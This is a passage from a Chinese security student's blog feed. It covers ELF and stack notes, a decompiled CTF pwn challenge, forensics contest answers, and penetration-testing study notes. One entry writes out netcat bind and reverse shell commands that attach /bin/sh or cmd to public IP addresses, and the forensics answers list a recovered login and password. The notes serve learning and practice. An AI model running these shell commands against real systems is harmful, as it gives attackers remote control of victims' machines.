格式的可执行文件，就会有程序头表。静态编译和动态编译的主要区别在于，静态编译会将所有的库函数都直接链接到可执行文件中，而动态编译则会在运行时动态链接库函数。这会影响到 ELF 文件的大小和复杂性，但并不会影响到程序头表的存在。</p><p>4.ELF (Executable and Linkable Format) 文件有三种主要类型：可重定位的文件（Relocatable file）、可执行文件（Executable file）和共享对象文件（Shared object file）。</p><ul><li>可重定位的文件（通常是编译器输出的目标文件，扩展名通常为 .o）只包含代码和数据，它们需要通过链接器（linker）与其他目标文件或库文件链接在一起，生成可执行文件或共享对象文件。因为这些文件不需要被直接执行，所以它们通常不包含程序头表（Program Header Table），只包含节头表（Section Header Table）。</li><li>可执行文件和共享对象文件（通常是动态链接库，Linux下扩展名通常为 .so）是需要被装载到内存中执行的，所以它们包含程序头表。程序头表描述了如何将文件的内容加载到内存中以供执行。</li></ul><p>注：共享库是动态库，和静态库有很大区别，每个使用静态库的程序都有一份静态库的副本。</p><h4 id="readelf-h-查看elf文件头信息"><a href="#readelf-h-查看elf文件头信息" class="headerlink" title="readelf -h 查看elf文件头信息"></a>readelf -h 查看elf文件头信息</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713021258414.png" alt="image-20230713021258414"></p><h2 id="十二、堆和栈"><a href="#十二、堆和栈" class="headerlink" title="十二、堆和栈"></a>十二、堆和栈</h2><p>1、虚拟空间地址（VMA）对进程的地址空间进行管理</p><p>2、程序直线所用的栈（Stack）、堆（Heap）空间的表现由VMA来控制</p><p>3、使用/proc可以看到VMA地址和堆栈的映射</p><h3 id="1、例子：-00205-c"><a href="#1、例子：-00205-c" class="headerlink" title="1、例子：    00205.c"></a>1、例子：    00205.c</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char* flag = "ctfshow{flag_is_here}";int main(){ while(1){ sleep(1); printf("%s",flag); fflush(stdout); } return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-gcc-o-00205-2-00205-c-转化为可执行文件"><a href="#1-gcc-o-00205-2-00205-c-转化为可执行文件" class="headerlink" title="1.gcc -o 00205-2 00205.c 转化为可执行文件"></a>1.gcc -o 00205-2 00205.c 转化为可执行文件</h4><h4 id="2-运行00205-2"><a href="#2-运行00205-2" class="headerlink" title="2.运行00205-2"></a>2.运行00205-2</h4><h4 id="3-ps-aux-grep-00205-2获取PID"><a href="#3-ps-aux-grep-00205-2获取PID" class="headerlink" title="3.ps aux | grep 00205-2获取PID"></a>3.ps aux | grep 00205-2获取PID</h4><h4 id="4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射"><a href="#4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射" class="headerlink" title="4.cat /proc/33983/maps  看程序 进程的内存的详细映射"></a>4.cat /proc/33983/maps  看程序 进程的内存的详细映射</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034048625.png" alt="image-20230713034048625"></p><h3 id="2、进程的VMA区域"><a href="#2、进程的VMA区域" class="headerlink" title="2、进程的VMA区域"></a>2、进程的VMA区域</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/002-1.jpg" alt="002-1"></p><h3 id="3、进程栈初始化"><a href="#3、进程栈初始化" class="headerlink" title="3、进程栈初始化"></a>3、进程栈初始化</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034926454.png" alt="image-20230713034926454"></p><h3 id="4、栈空间"><a href="#4、栈空间" class="headerlink" title="4、栈空间"></a>4、栈空间</h3><p>栈空间（Stack Space）是计算机内存中的一种区域，主要用于存储程序运行时的临时数据，如函数调用时的参数、返回地址以及局部变量等。栈空间的特 点是后进先出（LIFO，Last In First Out），即最后进入栈的数据会被最先取出。</p><p>在程序运行时，每当有函数调用发生，系统会在栈空间中为这个函数分配一块区域，这块区域被称为”栈帧”（Stack Frame）。栈帧中存储了这个函数的局部变量、参数以及返回地址等信息。当函数执行完毕后，对应的栈帧就会被销毁，释放其占用的栈空间。</p><p>栈空间的大小通常是有限的。如果程序在运行过程中超出了栈空间的大小限制，就会发生”栈溢出”（Stack Overflow）错误。这通常是由于递归调用过深或者局部变量过多导致的。</p><p>总的来说，栈空间是程序运行时存储临时数据的重要区域，它的管理方式决定了函数调用的工作方式以及程序的运行效率。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713035715924.png" alt="image-20230713035715924"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713041716448.png" alt="image-20230713041716448"></p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn004函数</title>
      <link href="/du-yu/pwn-begain-exerciser-01.html"/>
      <url>/du-yu/pwn-begain-exerciser-01.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn004"><a href="#pwn004" class="headerlink" title="pwn004"></a>pwn004</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) // 定义一个main函数，它接收三个参数：命令行参数的数量，命令行参数的列表，和环境变量的列表{  char s1[11]; // 定义一个字符数组s1，大小为11  char s2[12]; // 定义一个字符数组s2，大小为12  unsigned __int64 v6; // 定义一个unsigned __int64类型的变量v6  v6 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v6。这通常用于实现堆栈保护  setvbuf(_bss_start, 0LL, 2, 0LL); // 设置_bss_start的缓冲区模式为无缓冲  setvbuf(stdin, 0LL, 2, 0LL); // 设置stdin的缓冲区模式为无缓冲  strcpy(s1, "CTFshowPWN"); // 将字符串"CTFshowPWN"复制到s1中  logo(); // 调用logo函数，这个函数的具体实现没有给出，可能是用来显示一些信息或者图标  puts("find the secret !"); // 输出字符串"find the secret !"  __isoc99_scanf("%s", s2); // 从stdin读取一个字符串，并存储到s2中  if ( !strcmp(s1, s2) ) // 如果s1和s2相同（strcmp的返回值为0），则执行下一行的函数    execve_func(); // 调用execve_func函数，这个函数的具体实现没有给出，可能是执行一些特定的操作  return 0; // main函数返回0，表示程序正常结束}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="execve-func-函数："><a href="#execve-func-函数：" class="headerlink" title="execve_func()函数："></a>execve_func()函数：</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">unsigned __int64 execve_func() // 定义一个返回类型为unsigned __int64的函数execve_func{  char *argv[3]; // 定义一个字符指针数组argv，大小为3。这个数组用来存储execve函数的参数  unsigned __int64 v2; // 定义一个unsigned __int64类型的变量v2  v2 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v2。这通常用于实现堆栈保护  argv[0] = "/bin/sh"; // 将argv数组的第一个元素设为"/bin/sh"，这是要执行的程序的路径  argv[1] = 0LL; // 将argv数组的第二个元素设为0，表示参数列表结束  argv[2] = 0LL; // 将argv数组的第三个元素设为0，表示参数列表结束  execve("/bin/sh", argv, 0LL); // 调用execve函数，执行"/bin/sh"程序。argv是参数列表，0LL表示环境变量列表为空  return __readfsqword(0x28u) ^ v2; // 从FS段寄存器的偏移量0x28处再次读取一个64位的值，并与v2进行异或操作。如果结果为0，表示在函数执行过程中，堆栈没有被破坏}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数的主要逻辑是执行一个新的程序（bin/sh），并检查在执行过程中堆栈是否被破坏。如果堆栈被破坏，函数返回的值将不为0</p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础</title>
      <link href="/du-yu/pwn-begain-study01.html"/>
      <url>/du-yu/pwn-begain-study01.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a><strong>计算机基础</strong></h1><h2 id="一、操作系统"><a href="#一、操作系统" class="headerlink" title="一、操作系统"></a>一、操作系统</h2><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-1.jpg" alt="001-1" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-2.jpg" alt="001-2" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-3.jpg" alt="001-3" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-4.jpg" alt="001-4" style="zoom: 50%;"><h3 id="1、程序运行只在乎和编辑虚拟地址"><a href="#1、程序运行只在乎和编辑虚拟地址" class="headerlink" title="1、程序运行只在乎和编辑虚拟地址"></a>1、程序运行只在乎和编辑虚拟地址</h3><p>虚拟地址是由CPU和操作系统共同提供的一种内存管理技术。在现代计算机系统中，<strong>每个运行的程序都认为自己独占了所有的内存</strong>，<strong>这些内存地址就是虚拟地址</strong>。实际上，这些虚拟地址是由操作系统通过内存管理单元（MMU）映射到物理内存地址的。</p><h2 id="2、思考"><a href="#2、思考" class="headerlink" title="2、思考:"></a>2、思考:</h2><p> 在一个内存为256M的计算机上:执行程序A(需要内存10M),程序A连续计算并输出所得的质数。同时执行程序B(需要内存5M)，B程序从a.txt读入130MB数据，从b.xt读入50MB数据,数据合并后,存入c.txt. CPU是加何运作的? </p><ol><li><h3 id="程序加载："><a href="#程序加载：" class="headerlink" title="程序加载："></a><strong>程序加载</strong>：</h3><p>首先，操作系统会将程序A和程序B加载到内存中。由于程序A需要10MB内存，程序B需要5MB内存，总共需要15MB内存，这在256MB的内存中是完全可以容纳的。</p></li><li><h3 id="CPU调度："><a href="#CPU调度：" class="headerlink" title="CPU调度："></a><strong>CPU调度</strong>：</h3><p>操作系统会使用一种叫做进程调度的技术，将CPU的时间分配给程序A和程序B。例如，它可能先让程序A运行一段时间，然后再让程序B运行一段时间，如此反复，使得两个程序看起来像是在同时运行。</p></li><li><h3 id="虚拟内存和磁盘I-x2F-O："><a href="#虚拟内存和磁盘I-x2F-O：" class="headerlink" title="虚拟内存和磁盘I/O："></a><strong>虚拟内存和磁盘I/O</strong>：</h3><p>对于程序B，它需要读取的数据总量（130MB + 50MB）超过了物理内存的大小（256MB）。在这种情况下，操作系统会使用一种叫做虚拟内存的技术，将部分数据暂时存储在硬盘上，然后在需要的时候将这些数据加载到内存中。这种技术叫做页面交换（Page Swapping）或者换页（Paging）。同时，操作系统会使用缓冲技术，将读取和写入的数据暂时存储在内存中，然后在合适的时候再进行实际的磁盘I/O操作。</p></li><li><h3 id="数据合并和存储："><a href="#数据合并和存储：" class="headerlink" title="数据合并和存储："></a><strong>数据合并和存储</strong>：</h3><p>程序B在读取完所有数据并进行合并后，会将结果写入c.txt文件。这个过程可能会涉及到磁盘I/O操作，操作系统会负责管理这些操作。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CPU和操作系统会共同工作，通过进程调度、虚拟内存、磁盘I/O等技术，使得程序A和程序B可以在有限的内存和CPU资源中同时运行，并完成各自的任务。</p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子取证红包赛</title>
      <link href="/du-yu/cppu-electronic-forensics-01.html"/>
      <url>/du-yu/cppu-electronic-forensics-01.html</url>
      
        <content type="html"><![CDATA[<p>每日吐槽：蛙趣啊！~   该说不说，取证大师真的很强，但是也确实搞心态啊，取证三次，电脑崩掉2次，天选三太废物了啊~</p><p>1、cd082d248033cd557b42b5faa0de5b9f</p><p>(MD5: cd082d248033cd557b42b5faa0de5b9f<br>SHA1: b4b1c4145c599e7d232c3611317ed076495dafb9<br>SHA256: 78295b0b7a71c7dd7555cb2db923de6f78f5338a6aae9150a34fecd535487360<br>CRC32: b7ee2645)</p><p>2、6.1</p><p>3、2020-09-23 14:24:54</p><p>4、A</p><p>5、192.168.152.128</p><p>6、(UTC+08:00)</p><p>7、 ceabb038fdc3e2e55c1e78ad0a2e5fb9</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160238449.png" alt="image-20230702160238449" style="zoom:25%;"><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160401497.png" alt="image-20230702160401497" style="zoom:25%;"><p>8、6191e971cfdf5296ee7df7c2fed56377</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702162304311.png" alt="image-20230702162304311"></p><p>9、HackBar V2   、    Proxy SwitchyOmega</p><p>（差点被LZJ骗了，这个就是对的）</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702154910574.png" alt="image-20230702154910574" style="zoom:25%;"><p>10、7.2.</p><img src="C:\Users\asus\Pictures\Screenshots\Snipaste_2023-07-02_15-41-43.png" alt="Snipaste_2023-07-02_15-41-43" style="zoom:25%;"><p>11、192.168.152.150</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702180300769.png" alt="image-20230702180300769" style="zoom:25%;"><p>12、00-0C-29-0F-B9-F7</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702163500129.png" alt="image-20230702163500129" style="zoom:25%;"><p>13、CaiXX-PC</p><p>14、pico2020</p><p>15、105,906,176</p><p>16、A</p><p>17、B</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702182224126.png" alt="image-20230702182224126" style="zoom:25%;"><p>18、12753</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193248514.png" alt="image-20230702193248514" style="zoom:25%;"><p>19、 8f8319bc3c1b8ed92aa5498dd98c8e87e5f888f7<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193115519.png" alt="image-20230702193115519" style="zoom:25%;"></p><p>20、Administrator   、    Guest 、  chaunchaun</p><p>22、shuandan</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193916532.png" alt="image-20230702193916532"></p><p>23、<a href="http://www.tpshop.com.tar.gz/">www.tpshop.com.tar.gz</a></p><p>24、120ac49800671dc383b6f3709c25c099</p><p>两都是一样，所以是同一个webshell<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195054106.png" alt="image-20230702195054106"></p><p>25、 tpshop / s13132312s<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195519596.png" alt="image-20230702195519596" style="zoom:25%;"></p><p>27、26</p><p>31、9176</p><p>37、101</p><p>（一个一个数）</p><p>38、B</p>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证校赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>050文件上传漏洞</title>
      <link href="/du-yu/vulnerability-learning-02.html"/>
      <url>/du-yu/vulnerability-learning-02.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>上传图片—–&gt;base64数据（文件上传变为数据形式 ，方便存储在数据库中）</p><p>显示图片—–&gt;解码数据还原，如果不是图片则不显示</p><p>（可能有特殊符号各种什么的，转化为数据进行完整封装）</p><p>解析协议固定</p><p>不管是什么文件类型</p><p>解析为指定数据类型</p><p>数据存储文件，固定的协议解析文件</p><p>不管上传什么文件，只认数据</p><h3 id="大网站分站存储"><a href="#大网站分站存储" class="headerlink" title="大网站分站存储"></a>大网站分站存储</h3><p>保护域名——————–&gt;控制解析</p><p>想测试ZZ</p><p>OSS存储</p><p>如何判断：<strong>1.看上传之后的访问地址，如果后门无法解析就</strong></p><p><strong>2.看上传的数据包（bilibili）</strong></p><p><strong>3.分站上传看访问地址</strong></p><p><strong>4.一打开就是下载</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/Vulnerability-learning.png" alt="Vulnerability-learning"></p><h1 id="绕过（除了下面这种其他无解）"><a href="#绕过（除了下面这种其他无解）" class="headerlink" title="绕过（除了下面这种其他无解）"></a>绕过（除了下面这种其他无解）</h1><p>文件被锁</p><p>能控制上传文件写入目录</p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><p>上传以后就被杀掉了</p><h1 id="SDK阿里云"><a href="#SDK阿里云" class="headerlink" title="SDK阿里云"></a>SDK阿里云</h1>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>049挖洞思路</title>
      <link href="/du-yu/vulnerability-learning-01.html"/>
      <url>/du-yu/vulnerability-learning-01.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP中间件"><a href="#PHP中间件" class="headerlink" title="PHP中间件"></a>PHP中间件</h2><p>形成：网上找的中间件</p><h3 id="编译器漏洞"><a href="#编译器漏洞" class="headerlink" title="编译器漏洞"></a>编译器漏洞</h3><p>编译器（文件上传文件解析）</p><p>形成原因：代码逻辑存在安全问题（可能是从网上找的代码）</p><p>扫描目录，看ue版本，利用漏洞</p><h2 id="CMS源码"><a href="#CMS源码" class="headerlink" title="CMS源码"></a>CMS源码</h2><p>知道网站程序</p><p>已知漏洞，直接放到漏洞检测工具 </p><h2 id="原生态"><a href="#原生态" class="headerlink" title="原生态"></a>原生态</h2><p>对目标一无所知</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>审计自己写的和抄袭的</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>06抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动</title>
      <link href="/du-yu/information-collection-06.html"/>
      <url>/du-yu/information-collection-06.html</url>
      
        <content type="html"><![CDATA[<h3 id="web协议的抓包"><a href="#web协议的抓包" class="headerlink" title="web协议的抓包"></a>web协议的抓包</h3><p>工具：charles（茶杯）  Telerik Fiddler</p><p>BP设置代理的原理：感觉像充当一个VPN，让浏览器走监听的端口，BP监听或者拦截</p><p><strong>本机</strong>：证书——&gt;抓包</p><p><strong>模拟器</strong>：证书—–&gt;设置代理——&gt;抓包（封装和没封装的APP都能抓到）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-07%20085010.png" alt="屏幕截图 2023-06-07 085010"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>05基础命令&amp;反弹shell&amp;数据不回显带外查询</title>
      <link href="/du-yu/information-collection-05.html"/>
      <url>/du-yu/information-collection-05.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、常规基本渗透命令详解"><a href="#一、常规基本渗透命令详解" class="headerlink" title="一、常规基本渗透命令详解"></a>一、常规基本渗透命令详解</h2><p>(<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a>)</p><h4 id="实用案例1：文件上传下载-解决无图形化-amp-解决数据传输"><a href="#实用案例1：文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="实用案例1：文件上传下载-解决无图形化&amp;解决数据传输"></a>实用案例1：文件上传下载-解决无图形化&amp;解决数据传输</h4><p> 解决问题：不能正常在目标靶机下载后门，将文件上传到web服务器，在目标靶机用棱角社区生成的命令下载到目标靶机上</p><p>棱角社区：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><h2 id="二、反弹S-hell命令-解决数据回显-amp-解决数据通讯"><a href="#二、反弹S-hell命令-解决数据回显-amp-解决数据通讯" class="headerlink" title="二、反弹S hell命令-解决数据回显&amp;解决数据通讯"></a>二、反弹S hell命令-解决数据回显&amp;解决数据通讯</h2><p>常规的shell连接，攻击者的系统会连接到受害者的系统。但在反弹shell中，情况正好相反，是受害者的系统连接到攻击者的系统。好处：可以绕过防火墙和其他安全措施，因为大多数防火墙都是配置为阻止入站连接，而不是出站连接。</p><p>前提：需要攻击者能够在受害者的系统上<strong>执行代码</strong>，这通常需要利用某种漏洞，或者通过社会工程学的手段诱骗受害者执行恶意代码。此外，一旦建立了反弹shell，攻击者需要保持其系统在线，并监听来自受害者系统的连接。如果攻击者的系统离线，或者不再监听，那么反弹shell就会失效。</p><p>命令生成：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p><strong>实例</strong>：</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606173654309.png" alt="image-20230606173654309"></p><h2 id="三、正反向代理"><a href="#三、正反向代理" class="headerlink" title="三、正反向代理"></a>三、正反向代理</h2><h4 id="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"><a href="#原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接" class="headerlink" title="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"></a>原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接</h4><p>1、正向连接：本地监听等待对方连接</p><p>Linux控制Windows</p><p>//绑定CMD到本地5566端口</p><p>nc -e cmd -lvp 5566</p><p>//主动连接目标5566</p><p>ncat 47.122.23.131 5566</p><p>Windows控制Linux</p><p>//绑定SH到本地5566端口</p><p>ncat -e /bin/sh -lvp 5566</p><p>//主动连接目标5566</p><p>nc 47.94.236.117 5566</p><p>2、反向连接：主动给出去，对方监听</p><p>//绑定CMD到目标5566端口</p><p>ncat -e /bin/sh 47.122.23.131 5566</p><p>//等待5566连接</p><p>nc -lvvp 5566</p><p>//绑定CMD到目标5566端口</p><p>nc -e cmd 47.94.236.117 5566</p><p>//等待5566连接</p><p>ncat -lvvp 5566</p><h2 id="四、内网服务器"><a href="#四、内网服务器" class="headerlink" title="四、内网服务器"></a>四、内网服务器</h2><p>只有内网IP主动出去找主机IP（唯一）才行</p><p>在内网的路由器上设置一个<strong>端口转发</strong>（端口隐私），可以和内网的目标IP交互 </p><p><strong>两边都是内网</strong>，需要一个中间人</p><h2 id="五、数据回显-查询带外-amp-网络协议层级"><a href="#五、数据回显-查询带外-amp-网络协议层级" class="headerlink" title="五、数据回显-查询带外&amp;网络协议层级"></a>五、数据回显-查询带外&amp;网络协议层级</h2><p><strong>实例：</strong>防火墙组合数据不回显-ICMP带外查询Dnslog</p><p>漏洞有，数据无法回显：（原因：回显源代码被注释掉了或者直接没有）</p><p>解决：1.反弹shell </p><p>​          2.带外查询</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606184614766.png" alt="image-20230606184614766"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185106252.png" alt="image-20230606185106252"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185235140.png" alt="image-20230606185235140"></p><h2 id="带外查询："><a href="#带外查询：" class="headerlink" title="带外查询："></a>带外查询：</h2><p>演示中防火墙都开着，ping命令能绕过防火墙（大部分时候），<code>ping</code>命令使用的是ICMP协议（Internet Control Message Protocol），防火墙过滤的是TCP和UDP协议，比ICMP协议低一级</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606202146536.png" alt="image-20230606202146536"></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606225717092.png" alt="image-20230606225717092"></h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606230834445.png" alt="image-20230606230834445"></p><h2 id="六、防火墙出入站设置"><a href="#六、防火墙出入站设置" class="headerlink" title="六、防火墙出入站设置"></a>六、防火墙出入站设置</h2><p>入站设置：检查入站流量，只能<strong>反向连接</strong>，主动给出</p><p>出站设置：检查出站流量，<strong>正向连接</strong>（但是入站也会默认开启较严格的设置）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p> <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230607084906805.png" alt="image-20230607084906805"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04APP架构-封装&amp;原生态&amp;H5&amp;flutter</title>
      <link href="/du-yu/information-collection-04.html"/>
      <url>/du-yu/information-collection-04.html</url>
      
        <content type="html"><![CDATA[<h2 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h2><h3 id="1、原生开发"><a href="#1、原生开发" class="headerlink" title="1、原生开发"></a>1、原生开发</h3><p>安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p><p>APP-开发架构-原生态-IDEA</p><h4 id="安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）"><a href="#安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）" class="headerlink" title="安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）"></a>安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）</h4><h4 id="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"><a href="#安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包" class="headerlink" title="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"></a>安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包</h4><h3 id="2、使用H5语言开发（前端语言）"><a href="#2、使用H5语言开发（前端语言）" class="headerlink" title="2、使用H5语言开发（前端语言）"></a>2、使用H5语言开发（前端语言）</h3><p>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</p><h4 id="APP-开发架构-H5-amp-Vue-HBuilderX"><a href="#APP-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="APP-开发架构-H5&amp;Vue-HBuilderX"></a>APP-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h4 id="WX小程序-开发架构-H5-amp-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h3 id="3、使用flutter开发"><a href="#3、使用flutter开发" class="headerlink" title="3、使用flutter开发"></a>3、使用flutter开发</h3><p>flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p><h3 id="4、常规Web开发"><a href="#4、常规Web开发" class="headerlink" title="4、常规Web开发"></a>4、常规Web开发</h3><p>Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p><h4 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常Web安全测试</p><h4 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常规Web安全测试j</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img 